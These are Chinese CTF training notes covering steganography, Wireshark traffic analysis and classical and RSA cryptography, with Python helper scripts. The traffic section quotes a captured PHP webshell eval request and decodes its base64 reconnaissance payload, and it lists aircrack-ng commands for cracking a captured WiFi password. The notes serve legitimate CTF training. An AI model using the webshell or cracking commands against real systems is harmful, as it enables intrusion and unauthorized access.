+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865">常见文件文件头格式</a></p>
+</li>
+<li><p>题目</p>
+<ol>
+<li><p>查看属性 meinv.jpg  （易）</p>
+</li>
+<li><p>查看图片内容   hacker.jpg   （易）</p>
+</li>
+<li><p>binwalk + mp3stego   3.jpg  （中）</p>
+</li>
+<li><p>binwalk + 伪加密 carefully.jpg （中）  （ps：伪加密是在未加密的zip文件基础上修改了它的压缩源文件目录区里的全局方式位标记的比特值，使得压缩软件打开它的时候识别为加密文件，提示输入密码， 而在这个时候，不管你用什么软件对其进行密码破解，都无法打开它） </p>
+<p>伪加密（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26187985/article/details/83654197%EF%BC%89">https://blog.csdn.net/qq_26187985/article/details/83654197）</a></p>
+<p>将如图位置的09改为00即可，或者使用工具ZipCenOp.jar (用法 java -jar ZipCenOp.jar r xxx.zip)</p>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080507.png"></p>
+</li>
+<li><p>gif帧   flag.png.gif    (易)</p>
+</li>
+<li><p>压缩包爆破   love.zip   （中）</p>
+</li>
+<li><p>LSB隐写 tanwanlanyue   （中）</p>
+</li>
+<li><p>其他  f1ag.png   (中)</p>
+</li>
+<li><p>png改高度    dabai.png   (中) </p>
+<p>ps:png文件格式简介：</p>
+<p>89 50 4E 47 是文件的格式</p>
+<p>00 00 00 0D说明IHDR头块长为13</p>
+<p>49 48 44 52 IHDR标识</p>
+<p>00 00 01 F4  图像的宽</p>
+<p>00 00 01 A4 图像的高</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><hr>
+<p>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br>    LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。</p>
+<h2 id="day02–7iny"><a href="#day02–7iny" class="headerlink" title="day02–7iny"></a>day02–7iny</h2><h3 id="内容简介："><a href="#内容简介：" class="headerlink" title="内容简介："></a>内容简介：</h3><p>day02以流量分析，加密解密为主。例题<code>day02.zip</code>下载网盘<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw">链接</a> 提取码: fjru</p>
+<h3 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h3><p>Wireshark是目前全球使用最广泛的开源抓包软件（前身为Etherea1），是一个通用化的网络数据嗅探器和协议分析器，由Gerald Combs编写并于1998年以GPL开源许可证发布。</p>
+<h3 id="推荐资料："><a href="#推荐资料：" class="headerlink" title="推荐资料："></a>推荐资料：</h3><p>《Wireshark数据包分析实战》第二版Chris Sanders<br>《Wireshark网络分析》第二版Laura Chappe11<br>《TCP/IP协议栈详解卷一》W.Richard Stevens</p>
+<h3 id="相关站点："><a href="#相关站点：" class="headerlink" title="相关站点："></a>相关站点：</h3><p>官网下载<a target="_blank" rel="noopener" href="https://www.wireshark.org/#download">地址</a></p>
+<p>官方<a target="_blank" rel="noopener" href="https://wiki.wireshark.org/">wiki页面</a></p>
+<h3 id="流量分析："><a href="#流量分析：" class="headerlink" title="流量分析："></a>流量分析：</h3><p><strong>流量分析有以下三个方向：</strong><br>1、流量包修复<br>2、协议分析<br>3、数据提取<br><strong>转载</strong>来自<code>Yokeen总结</code></p>
+<h4 id="1、流量包修复"><a href="#1、流量包修复" class="headerlink" title="1、流量包修复"></a>1、流量包修复</h4><p>通常都借助现成的工具例如PCAPFIX直接修复</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://f00l.de/hacking/pcapfix.php">在线PCAPFIX</a></p>
+</li>
+<li><p>PCAPFIX<a target="_blank" rel="noopener" href="https://github.com/Rup0rt/pcapfix/tree/devel">下载</a><br>流量包常见的块，详细介绍可以看：<a target="_blank" rel="noopener" href="http://www.tcpdump.org/pcap/pcap.html">http://www.tcpdump.org/pcap/pcap.html</a></p>
+</li>
+</ul>
+<h4 id="2、协议分析"><a href="#2、协议分析" class="headerlink" title="2、协议分析"></a>2、协议分析</h4><p>须掌握wireshark过滤器（捕捉过滤器与显示过滤器）的基础语法，从而更快更精准的获取指定的信息。<br><code>捕捉过滤器</code>：用于决定将什么样的信息记录在捕捉结果中，需要在开始捕捉前设置。<br><code>显示过滤器</code>：用于在捕获结果中进行详细查找，可以在得到捕捉结果后进行更改<br>捕捉过滤器基础语法<br>Protocol Direction Host(s) Value LogicalOperations other expression<br>tcp dst 10.1.1.1 80 and tcp dst 10.2.2.2 3128</p>
+<p>Protocol<br>可能的值: ether, fddi, ip, arp, rarp, decnet,lat, sca, moprc, mopdl, tcp and udp，如果没有特别指明是什么协议，则默认使用所有支持的协议。<br>Direction<br>可能的值: src, dst, src and dst, src or dst，如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。<br>Host(s)<br>可能的值： net, port,host, portrange，如果没有指定此值，则默认使用”host”关键字。<br>例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。<br>Logical Operations<br>可能的值：not, and, or<br>否(“not”)具有最高的优先级，或(“or”)和与(“and”)具有相同的优先级<br>“not tcp port 3128 and tcp port23”与”(not tcp port 3128) and tcp port23”相同。</p>
+<p>举例分析：<br>tcp dst port 3128 //目的TCP端口为3128的封包。<br>ip src host 10.1.1.1 //来源IP地址为10.1.1.1的封包。<br>host 10.1.2.3 //目的或来源IP地址为10.1.2.3的封包。<br>src portrange 2000-2500<br>//来源为UDP或TCP，并且端口号在2000至2500范围内的封包<br>not icmp //除了icmp以外的所有封包。</p>
+<p>显示过滤器基础语法<br>Protocol String1 String2 ComparisonOperator Value Logical Operations other expression<br>Protocol<br>可以使用大量位于OSI模型第2至7层的协议。在Expression中可以看到，例如，IP，TCP，DNS，SSH<br>String1，String2<br>可选择显示过滤器右侧表达式，点击父类的+号，然后查看其子类<br>Comparison Oerators<br>可以使用六种比较运算符<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>eq|==|等于|<br>ne|!=|不等于|<br>gt|&gt;|大于|<br>It|&lt;|小于|<br>ge|&gt;=|大于等于|<br>le|&lt;=|小于等于|</p>
+<p>Logical Expressions<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>and|&amp;&amp;|逻辑与<br>or| <code>||</code>|逻辑或<br>xor| <code>^^</code>|逻辑异或<br>not| !|逻辑非</p>
+<p>举例分析：<br>snmp || dns || icmp //显示SNMP或DNS或ICMP封包<br>ip.addr == 10.1.1.1 //显示源或目的IP为10.1.1.1的封包<br>ip.src != 10.1.2.3 and ip.dst!=10.4.5.6 //显示源不为10.1.2.3并且目的不为10.4.5.6的封包<br>tcp.port == 25 //显示来源或目的TCP端口号为25的封包<br>tcp.dport == 25 //显示目的TCP端口号为25的封包</p>
+<p>如果过滤器语法是正确的，表达式背景为<code>绿色</code>，否则为<code>红色</code><br>前文中的wireshark文件还原就可以说是一个很基础的数据包流量分析。</p>
+<h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>这一块是流量包中另一个重点，通过对协议分析，找到题目的关键点，从而对所需要的数据进行提取。</p>
+<p>可以学习一下tshark的使用<br>tshark作为wireshark的命令行版，高效快捷是它的优点，配合其余命令行工具(awk,grep)等灵活使用，可以快速定位，提取数据从而省去了繁杂的脚本编写</p>
+<pre><code>常用方法：tshark -r *.pcap -Y ** -T fields -e **|***&gt;data</code></pre>
+<h4 id="题目1、MISC-rar"><a href="#题目1、MISC-rar" class="headerlink" title="题目1、MISC.rar"></a>题目1、MISC.rar</h4><blockquote>
+<p>key为文本格式，你找得到吗？</p>
+</blockquote>
+<p>用wireshark打开数据包，在文件 -&gt; 导出对象中，选择HTTP-&gt;保存txt文件</p>
+<h4 id="题目2、A记录（蓝鲸）"><a href="#题目2、A记录（蓝鲸）" class="headerlink" title="题目2、A记录（蓝鲸）"></a>题目2、A记录（蓝鲸）</h4><blockquote>
+<p>他在看什么视频，好像很好看，不知道是什么网站的。 还好我截取了他的数据包，找呀找。 key就是网站名称。格式ctf{key} tip:A记录的第一条。所以答案是</p>
+</blockquote>
+<p>ps:在数据包分析工具中，看到的都是加密后的802.11协议的数据包，而无法看到数据包的原始内容。为了方便分析，aircrack-ng工具包提供了一个专用解密工具airdecap-ng。<strong>kali自带</strong></p>
+<p>1.aircrack-ng shipin.cap -w password.txt<br>2.airdecap-ng shipin.cap -e 0719 -p 88888888<br>3.top1000弱口令<a target="_blank" rel="noopener" href="https://www.yesck.com/down/TOP1000password.txt">下载</a></p>
+<h4 id="题目3、好多苍蝇【蓝鲸】"><a href="#题目3、好多苍蝇【蓝鲸】" class="headerlink" title="题目3、好多苍蝇【蓝鲸】"></a>题目3、好多苍蝇【蓝鲸】</h4><blockquote>
+<p>好多苍蝇啊，吧我的重要文件都爬满了，看不到怎么办？提交格式是flag{xxxx},所以答案是？</p>
+</blockquote>
+<ul>
+<li>738数据包，导出application/octet-stream的数据流，删除(00000160,B)之前的都是不需要的数据，拼接数据。伪加密，foremost分离。<br>Tools：<br>hxD:<a target="_blank" rel="noopener" href="https://mh-nexus.de/en/downloads.php?product=HxD20">下载</a><br>类似软件，了解不推荐<br>winhex:<a target="_blank" rel="noopener" href="http://www.x-ways.net/winhex/">下载</a><br>Notepad++ 16进制编辑功能:<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/npp-plugins/files/Hex%20Editor/">下载UNI</a><br>解压缩后把HexEditor.dll文件复制到安装目录（如Notepad++\plugins），退出需要以十六进制显示时，点击菜单的：【插件】－【Hex-Editor】－【View in Hex】即可。</li>
+</ul>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章:"></a>参考文章:</h3><p>1.某大佬给新疆电网培训<a href="%5Bhttps://www.addon.pub/2018/04/10/CTF%E4%B8%AD%E7%9A%84%E6%9D%82%E9%A1%B9%E5%B0%8F%E7%BB%93/%5D(https://www.addon.pub/2018/04/10/CTF%E4%B8%AD%E7%9A%84%E6%9D%82%E9%A1%B9%E5%B0%8F%E7%BB%93/)">MISC总结</a></p>
+<p>2.流量分析–<a target="_blank" rel="noopener" href="https://skysec.top/2018/04/21/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CTF%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98">ctf实战</a></p>
+<p>3.流量分析–<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1960">HTTP认识</a></p>
+<p>4.蓝鲸安全CTF打卡第一期杂项篇<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/84a65b64c742">WriteUp</a></p>
+<p>5.蓝鲸安全30day打卡<a target="_blank" rel="noopener" href="http://codeqi.top/2018/02/06/30-Days/">Writeup</a></p>
+<h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="RSA学习"><a href="#RSA学习" class="headerlink" title="RSA学习"></a>RSA学习</h4><p>从0到1，<a target="_blank" rel="noopener" href="http://since1994.cn/?p=164">基础知识</a></p>
+<h4 id="RSA出题"><a href="#RSA出题" class="headerlink" title="RSA出题"></a>RSA出题</h4><p>参考<a target="_blank" rel="noopener" href="https://0verwatch.top/RSA-SimpleLearn.html">博客</a></p>
+<h4 id="题目1：密钥生成"><a href="#题目1：密钥生成" class="headerlink" title="题目1：密钥生成"></a>题目1：密钥生成</h4><blockquote>
+<p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d,格式：key{xxxx}</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080619.jpg"></p>
+<ul>
+<li><p>已知p q e 解d <a target="_blank" rel="noopener" href="http://since1994.cn/?p=166">详细讲解</a></p>
+<pre><code class="txt">ed ≡ 1 (mod r)
+r = (p-1)(q-1) = 2135733082216268400
+ed mod r = 1 mod r</code></pre>
+<pre><code class="python">p=473398607161
+q=4511491
+e=17
+r=(p-1)*(q-1)
+i=0
+while True:
+    if (1-r*i)%e == 0:
+        break
+    i-=1
+    print (&#39;d:&#39; + &#39;%d&#39; % ((1-r*i)/e))</code></pre>
+<p>使用rsatool.py进行计算，环境kali,python2.X</p>
+<blockquote>
+<p>sudo apt-get install libgmp-dev</p>
+<p>pip install gmpy</p>
+</blockquote>
+<p>python2 rsatool.py -p 473398607161 -q 4511491 -e 17</p>
+<pre><code class="python">#!/usr/bin/python2
+import base64, fractions, optparse, random
+import gmpy
+
+from pyasn1.codec.der import encoder
+from pyasn1.type.univ import *
+
+PEM_TEMPLATE = &#39;-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n&#39;
+DEFAULT_EXP = 65537
+
+def factor_modulus(n, d, e):
+    &quot;&quot;&quot;
+    Efficiently recover non-trivial factors of n
+    See: Handbook of Applied Cryptography
+    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)
+    http://www.cacr.math.uwaterloo.ca/hac/
+    &quot;&quot;&quot;
+    t = (e * d - 1)
+    s = 0
+
+    while True:
+        quotient, remainder = divmod(t, 2)
+
+        if remainder != 0:
+            break
+
+        s += 1
+        t = quotient
+
+    found = False
+
+    while not found:
+        i = 1
+        a = random.randint(1,n-1)
+
+        while i &lt;= s and not found:
+            c1 = pow(a, pow(2, i-1, n) * t, n)
+            c2 = pow(a, pow(2, i, n) * t, n)
+
+            found = c1 != 1 and c1 != (-1 % n) and c2 == 1
+
+            i += 1
+
+    p = fractions.gcd(c1-1, n)
+    q = (n / p)
+
+    return p, q
+
+class RSA:
+    def __init__(self, p=None, q=None, n=None, d=None, e=DEFAULT_EXP):
+        &quot;&quot;&quot;
+        Initialize RSA instance using primes (p, q)
+        or modulus and private exponent (n, d)
+        &quot;&quot;&quot;
+
+        self.e = e
+
+        if p and q:
+            assert gmpy.is_prime(p), &#39;p is not prime&#39;
+            assert gmpy.is_prime(q), &#39;q is not prime&#39;
+
+            self.p = p
+            self.q = q
+        elif n and d:   
+            self.p, self.q = factor_modulus(n, d, e)
+        else:
+            raise ArgumentError(&#39;Either (p, q) or (n, d) must be provided&#39;)
+
+        self._calc_values()
+
+    def _calc_values(self):
+        self.n = self.p * self.q
+
+        phi = (self.p - 1) * (self.q - 1)
+        self.d = gmpy.invert(self.e, phi)
+
+        # CRT-RSA precomputation
+        self.dP = self.d % (self.p - 1)
+        self.dQ = self.d % (self.q - 1)
+        self.qInv = gmpy.invert(self.q, self.p)
+
+    def to_pem(self):
+        &quot;&quot;&quot;
+        Return OpenSSL-compatible PEM encoded key
+        &quot;&quot;&quot;
+        return PEM_TEMPLATE % base64.encodestring(self.to_der())
+
+    def to_der(self):
+        &quot;&quot;&quot;
+        Return parameters as OpenSSL compatible DER encoded key
+        &quot;&quot;&quot;
+        seq = Sequence()
+
+        for x in [0, self.n, self.e, self.d, self.p, self.q, self.dP, self.dQ, self.qInv]:
+            seq.setComponentByPosition(len(seq), Integer(x))
+
+        return encoder.encode(seq)
+
+    def dump(self, verbose):
+        vars = [&#39;n&#39;, &#39;e&#39;, &#39;d&#39;, &#39;p&#39;, &#39;q&#39;]
+
+        if verbose:
+            vars += [&#39;dP&#39;, &#39;dQ&#39;, &#39;qInv&#39;]
+
+        for v in vars:
+            self._dumpvar(v)
+
+    def _dumpvar(self, var):
+        val = getattr(self, var)
+
+        parts = lambda s, l: &#39;\n&#39;.join([s[i:i+l] for i in xrange(0, len(s), l)])
+
+        if len(str(val)) &lt;= 40:
+            print &#39;%s = %d (%#x)\n&#39; % (var, val, val)
+        else:
+            print &#39;%s =&#39; % var
+            print parts(&#39;%x&#39; % val, 80) + &#39;\n&#39;
+
+</code></pre>
+</li>
+</ul>
+<p>  if <strong>name</strong> == ‘<strong>main</strong>‘:<br>      parser = optparse.OptionParser()</p>
+<pre><code>  parser.add_option(&#39;-p&#39;, dest=&#39;p&#39;, help=&#39;prime&#39;, type=&#39;int&#39;)
+  parser.add_option(&#39;-q&#39;, dest=&#39;q&#39;, help=&#39;prime&#39;, type=&#39;int&#39;)
+  parser.add_option(&#39;-n&#39;, dest=&#39;n&#39;, help=&#39;modulus&#39;, type=&#39;int&#39;)
+  parser.add_option(&#39;-d&#39;, dest=&#39;d&#39;, help=&#39;private exponent&#39;, type=&#39;int&#39;)
+  parser.add_option(&#39;-e&#39;, dest=&#39;e&#39;, help=&#39;public exponent (default: %d)&#39; % DEFAULT_EXP, type=&#39;int&#39;, default=DEFAULT_EXP)
+  parser.add_option(&#39;-o&#39;, dest=&#39;filename&#39;, help=&#39;output filname&#39;)
+  parser.add_option(&#39;-f&#39;, dest=&#39;format&#39;, help=&#39;output format (DER, PEM) (default: PEM)&#39;, type=&#39;choice&#39;, choices=[&#39;DER&#39;, &#39;PEM&#39;], default=&#39;PEM&#39;)
+  parser.add_option(&#39;-v&#39;, dest=&#39;verbose&#39;, help=&#39;also display CRT-RSA representation&#39;, action=&#39;store_true&#39;, default=False)
+
+  try:
+      (options, args) = parser.parse_args()
+
+      if options.p and options.q:
+          print &#39;Using (p, q) to initialise RSA instance\n&#39;
+          rsa = RSA(p=options.p, q=options.q, e=options.e)
+      elif options.n and options.d:
+          print &#39;Using (n, d) to initialise RSA instance\n&#39;
+          rsa = RSA(n=options.n, d=options.d, e=options.e)
+      else:
+          parser.print_help()
+          parser.error(&#39;Either (p, q) or (n, d) needs to be specified&#39;)
+
+      rsa.dump(options.verbose)
+
+      if options.filename:
+          print &#39;Saving %s as %s&#39; % (options.format, options.filename)
+
+
+          if options.format == &#39;PEM&#39;:
+              data = rsa.to_pem()
+          elif options.format == &#39;DER&#39;:
+              data = rsa.to_der()
+
+          fp = open(options.filename, &#39;wb&#39;)
+          fp.write(data)
+          fp.close()
+
+  except optparse.OptionValueError, e:
+      parser.print_help()
+      parser.error(e.msg)</code></pre>
+<pre><code>
+
+
+#### 参考文章
+1.CTFwiki--[密码学部分](https://wiki.x10sec.org/crypto/introduction/)
+
+2.RSA介绍--[总结](https://www.jianshu.com/p/0c4943d7ea2d)
+
+
+
+## day02--Danie1
+
+### 流量分析
+
+---
+
+
+
+在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，参赛选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索。 
+
+pcap流量包的分析通常都是通过图形化的网络嗅探器——wireshark进行的，这款嗅探器经过众多开发者的不断完善，现在已经成为使用最为广泛的安全工具之一。
+
+
+
+Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。
+
+
+
+### 经典题型
+
+* CTF题型主要分为流量包修复、WEB流量包分析、USB流量包分析和其他流量包分析。
+
+
+
+### 实例
+
+* 流量包修复
+
+比赛中可能会出现通过wireshark打开题目给的流量包后提示包异常的情况，如图
+
+ ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080601.png)
+
+* 思路
+
+* 在线修复网站：http://f00l.de/hacking/pcapfix.php
+
+* 题目
+
+第一届 “百度杯” 信息安全攻防总决赛 线上选拔赛：find the flag
+
+pacp文件地址：https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap
+
+* 解题思路：
+
+* 在线修复，修复完毕后用wireshark打开，查找分组字节流-字符串-flag
+
+* ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080602.png)
+
+
+* 看到where is the flag？继续查看下一个数据包
+
+* 发现两个包id对应的字段刚好是flag
+
+* ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080603.png)
+
+
+* ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080604.png)
+
+
+* 按照同样的方式连接后面相连数据包的id字段，找到最终的flag
+
+  `flag&#123;aha!_you_found_it!&#125;`
+
+
+
+* 基本的流量包分析
+
+* question
+
+题目  test3.pcapng
+
+* question
+
+题目 test.pcapng
+
+* question
+
+题目链接：链接: https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg  密码: l43q
+
+
+
+解题思路：wireshark打开流量包
+
+![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080605.png)
+
+可以看到User和pass，且都是base64编码
+
+解码可以得到
+
+user:test@51elab.com
+
+passwd:FLAG:ISCCTESTpas
+
+
+
+
+
+* question
+
+题目链接：链接: https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg  密码: 9r2i
+
+
+
+​      解题思路：wireshark打开流量包，追踪tcp流，在第二个流中发现flag
+
+​         ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080606.png)
+
+
+
+
+
+
+* question
+
+题目链接：链接: https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A  密码: wk6w
+
+
+
+解题思路：wireshark打开流量包，过滤显示http协议包
+
+ ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080607.png)
+
+
+发现不停的向一个目录post数据，猜测有人在上传一句话
+
+追踪tcp流，发现
+
+```txt
+cmd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</code></pre>
+<p>  先进行url解码，再进行base64解码，得到</p>
+<pre><code>    php
+
+    @ini_set(“display_errors”,”0″);
+
+    @set_time_limit(0);
+
+    @set_magic_quotes_runtime(0);
+
+    echo(“-&gt;|”);;
+
+    $D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);
+
+    if($D==”&quot;)
+
+        $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);
+
+    $R=”&#123;$D&#125;\t”;
+
+    if(substr($D,0,1)!=”/”)
+
+    &#123;
+
+        foreach(range(“A”,”Z”) as $L)
+
+            if(is_dir(“&#123;$L&#125;:”))
+
+                $R.=”&#123;$L&#125;:”;
+
+    &#125;
+
+    $R.=”\t”;
+
+    $u=(function_exists(‘posix_getegid’))?@posix_getpwuid(@posix_geteuid()):”;
+
+    $usr=($u)?$u[&#39;name&#39;]:@get_current_user();
+
+    $R.=php_uname();
+
+    $R.=”(&#123;$usr&#125;)”;
+
+    print $R;;
+
+    echo(“|&lt;-”);
+
+    die();
+</code></pre>
+<p>  在tcp stream 5发现一个压缩包，下载</p>
+<p>  在tcp stream 6发现png文件头89504E47</p>
+<p>  保存为一张png图片</p>
+<ul>
+<li><p>question</p>
+<p>破解wifi密码（文件wifi.cap）</p>
+<pre><code class="txt">flag格式：flag&#123;你破解的WiFi密码&#125;
+
+tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你
+1391040**
+Goodluck!!</code></pre>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080608.png"></p>
+</li>
+</ul>
+<p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080609.png"></p>
+<h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41187256/article/details/79693012">https://blog.csdn.net/qq_41187256/article/details/79693012</a></p>
+<ul>
+<li><p>栅栏密码</p>
+<p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话</p>
+<p>明文：THERE IS A CIPHER<br>去掉空格后变为：THEREISACIPHER<br>两个一组，得到：TH ER EI SA CI PH ER<br>先取出第一个字母：TEESCPE<br> 再取出第二个字母：HRIAIHR<br>连在一起就是：TEESCPEHRIAIHR<br>还原为所需密码。<br>而解密的时候，我们先把密文从中间分开，变为两行：<br>T E E S C P E<br>H R I A I H R<br>再按上下上下的顺序组合起来：<br>THEREISACIPHER<br>分出空格，就可以得到原文了：<br>THERE IS A CIPHER</p>
+</li>
+<li><p>Brainfuck/Ook!编码</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/">https://tool.bugku.com/brainfuck/</a></p>
+</li>
+</ul>
+<pre><code>  Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+  Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
+  Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+  Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.
+  Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.
+  Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!
+  Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.
+  Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </code></pre>
+<ul>
+<li><p>培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：<br>第一种方式：<br>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab<br>K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb Y bbaaa Z bbaab<br>第二种方式<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA</p>
+<p>f AABAB m ABABB s BAAAB z BABBB</p>
+</li>
+</ul>
+<p>例：</p>
+<pre><code class="python">baabbaabaabaaaababbaaabbaabbababbabaaabb</code></pre>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xuqi7/article/details/52261291">脚本工具</a></p>
+<ul>
+<li><p>caesar（凯撒）</p>
+<p>使用python pycipher库</p>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080610.png"></p>
+</li>
+</ul>
+<ul>
+<li><p>RSA算法(非对称密码)</p>
+<p>加密过程  选择两个大素数p和q，计算出模数N = p * q </p>
+<p>计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质</p>
+<p> 取e的模反数为d，计算方法: e * d ≡ 1 (mod φ) </p>
+<p>对明文m进行加密：c≡m^e (mod n) 或 c = pow(m,e,n)，得到的B即为密文 </p>
+<p>对密文c进行解密，m≡c^d( mod n) 或 m = pow(c,d,n)，得到的A即为明文</p>
+<p> p 和 q ：大整数N的两个因子（factor）</p>
+<p> N：大整数N，我们称之为模数（modulus）</p>
+<p> e 和 d：互为模反数的两个指数（exponent）</p>
+<p> c 和 m：分别是密文和明文，这里一般指的是一个十进制的数</p>
+<p>一般有如下称呼：</p>
+<p>（N，e）：公钥</p>
+<p>（N，d）：私钥</p>
+<p>分解N可以在线factordb.com</p>
+</li>
+<li><p>代码</p>
+<pre><code class="python">#-*-coding:utf-8-*-
+
+def split_n(n):   #分解n
+    for i in range(2,n):
+        if n%i == 0:
+            p = i
+            q = int(n/i)
+            break
+    return p,q
+
+def egcd(a, b):   #求d
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        exit(&#39;wrong&#39;)
+    else:
+        return x % m
+
+e=17
+n=2135733555619387051
+c=781391873123526159
+p,q=split_n(n)
+print(&#39;n:%d&#39;%n)
+print(&#39;e:%d&#39;%e)
+print(&#39;c:%d&#39;%c)
+print(&quot;p = &quot; + str(p))
+print(&quot;q = &quot; + str(q))
+d=modinv(e,(p-1)*(q-1))
